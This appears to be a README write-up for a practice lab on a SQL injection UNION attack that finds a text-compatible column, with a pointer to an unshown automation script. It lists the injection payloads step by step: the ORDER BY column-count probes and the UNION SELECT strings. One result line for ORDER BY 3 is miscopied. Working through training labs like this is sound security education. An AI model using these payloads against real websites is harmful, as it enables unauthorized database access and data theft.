# SQL Injection Lab 08 - SQL injection UNION attack, finding a column containing text

## Manual Solution

1. Access the lab in Web Security Academy
2. Determine the number of columns for UNION attack
   - Test: `/filter?category=Gifts' ORDER BY 1--`
   - Result: No error (at least 1 column exists)
   - Test: `/filter?category=Gifts' ORDER BY 2--`
   - Result: No error (at least 2 columns exist)
   - Test: `/filter?category=Gifts' ORDER BY 3--`
   - Result: No error (at least 2 columns exist)
   - Test: `/filter?category=Gifts' ORDER BY 4--`
   - Result: Error (confirms 3 columns)

3. Append injection to the URL:
   - Test: `/filter?category=Gifts' UNION SELECT '1','2','3'--`
   - Result: You'll see the which column compatible with the string data in the response.

4. Append the string data requested from us:
   - Test: `/filter?category=Gifts' UNION SELECT '1','[YOUR_STRING_DATA]','3'--`
   - Result: Congratulations, you solved the lab!

## Automated Solution

1. Download the script
2. Run the script with the following command: python sqli_lab_08.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)

